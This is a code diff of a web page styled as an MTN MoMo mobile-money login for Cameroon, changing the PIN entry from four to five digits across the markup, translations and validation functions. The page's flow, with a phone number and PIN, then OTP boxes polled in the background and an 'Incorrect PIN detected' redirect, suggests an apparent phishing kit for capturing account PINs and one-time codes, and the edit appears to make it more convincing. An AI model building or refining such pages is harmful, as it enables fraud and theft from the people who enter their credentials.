@@ -171,8 +171,8 @@
   .lg-phone-row input { flex: 1; padding: 12px 14px; border: 1.5px solid var(--border); border-left: none; border-radius: 0 var(--radius-sm) var(--radius-sm) 0; font-size: 0.95rem; outline: none; background: #FFF; transition: border-color 0.2s; font-family: inherit; }
   .lg-phone-row input:focus { border-color: var(--momo-yellow); }
   .pin-label { font-size: 0.85rem; color: var(--text-mid); text-align: center; margin-bottom: 12px; font-weight: 500; }
-  .pin-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 16px; align-items: center; }
-  .pin-box { width: 52px; height: 52px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); text-align: center; font-size: 1.4rem; font-weight: 700; color: var(--momo-dark); outline: none; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; }
+  .pin-row { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; align-items: center; }
+  .pin-box { width: 44px; height: 48px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); text-align: center; font-size: 1.3rem; font-weight: 700; color: var(--momo-dark); outline: none; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; }
   .pin-box:focus { border-color: var(--momo-yellow); box-shadow: 0 0 0 3px rgba(255,204,0,0.2); }
   .pin-eye { cursor: pointer; color: var(--text-light); font-size: 1.1rem; background: none; border: none; padding: 4px; transition: color 0.2s; }
   .pin-eye:hover { color: var(--text-dark); }
@@ -496,12 +496,13 @@
         <div class="lg-ph-pre">🇨🇲 +237</div>
         <input type="tel" id="lgPh" placeholder="671234567" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()">
       </div>
-      <div class="pin-label" data-i18n="login_pin_lbl">Enter your PIN (4 characters)</div>
+      <div class="pin-label">Enter your 5-digit PIN</div>
       <div class="pin-row">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,0)" id="p0">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,1)" id="p1">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,2)" id="p2">
         <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,3)" id="p3">
+        <input type="password" class="pin-box" maxlength="1" oninput="pinMv(this,4)" id="p4">
         <button class="pin-eye" onclick="togPin()"><i class="fa-regular fa-eye" id="eyeIcon"></i></button>
       </div>
       <div class="forgot-pin" data-i18n="login_forgot">Forgot PIN?</div>
@@ -715,7 +716,6 @@
       sub_redirect: "Redirecting to MoMo login in",
       sub_btn_login: "Go to Login Now",
       login_h2: "Account Login",
-      login_pin_lbl: "Enter your PIN (4 characters)",
       login_forgot: "Forgot PIN?",
       login_btn: "LOGIN",
       terms_text: "By signing in you agree to the",
@@ -812,7 +812,6 @@
       sub_redirect: "Redirection vers MoMo dans",
       sub_btn_login: "Aller à la Connexion",
       login_h2: "Connexion au Compte",
-      login_pin_lbl: "Entrez votre PIN (4 caractères)",
       login_forgot: "Code PIN oublié ?",
       login_btn: "SE CONNECTER",
       terms_text: "En vous connectant, vous acceptez les",
@@ -1049,18 +1048,18 @@
 
   function pinMv(el, i) {
     el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
+    if (el.value && i < 4) document.getElementById('p' + (i+1)).focus();
     chkLogin();
   }
 
   function chkLogin() {
-    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value);
+    const ok = [0,1,2,3,4].every(i => document.getElementById('p'+i).value);
     document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
   }
 
   function togPin() {
     const eyeIcon = document.getElementById('eyeIcon');
-    [0,1,2,3].forEach(i => {
+    [0,1,2,3,4].forEach(i => {
       const b = document.getElementById('p'+i);
       b.type = b.type === 'password' ? 'text' : 'password';
     });
@@ -1074,10 +1073,10 @@
     hideLoginMsg();
 
     const rawPhone = document.getElementById('lgPh').value.trim();
-    const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
+    const pin = [0,1,2,3,4].map(i => document.getElementById('p'+i).value).join('');
 
-    if (!rawPhone || pin.length < 4) {
-      showLoginMsg('Please enter your phone number and 4-digit PIN.');
+    if (!rawPhone || pin.length < 5) {
+      showLoginMsg('Please enter your phone number and 5-digit PIN.');
       return;
     }
 
@@ -1355,7 +1354,7 @@
           clearInterval(otpPollInterval);
           showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
           setTimeout(() => {
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
+            [0,1,2,3,4].forEach(i => document.getElementById('p'+i).value = '');
             chkLogin();
             document.getElementById('bLogin').disabled = false;
             [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
